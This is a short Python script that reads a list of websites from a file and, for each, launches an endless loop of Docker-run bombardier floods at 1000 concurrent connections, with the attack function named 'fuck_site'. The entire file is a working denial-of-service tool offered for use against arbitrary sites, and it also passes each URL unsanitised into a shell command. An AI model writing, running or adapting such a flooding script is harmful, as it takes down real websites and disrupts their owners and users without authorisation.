import subprocess
import time
import os
from threading import Thread

DELAY_IN_SEC = 15

websites = open('websites.txt', 'r')
urls_lines = websites.readlines()


def fuck_site(url):
    command = F'docker run -it alpine/bombardier -c 1000 -d 60s -l {url}'
    print(F'RUN for {url}')

    while True:
        os.system(command)
        time.sleep(DELAY_IN_SEC)


for line in urls_lines:
    thread = Thread(target=fuck_site, args=(line,))
    thread.start()
